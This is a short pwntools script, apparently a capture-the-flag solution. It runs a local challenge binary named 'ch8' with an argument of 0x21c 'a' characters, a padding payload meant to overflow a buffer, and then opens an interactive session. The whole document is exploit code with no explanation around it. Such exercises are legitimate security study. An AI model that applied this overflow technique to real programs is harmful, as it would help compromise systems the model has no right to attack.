from pwn import*

p=process(["./ch8", "a"*0x21c])

p.interactive()
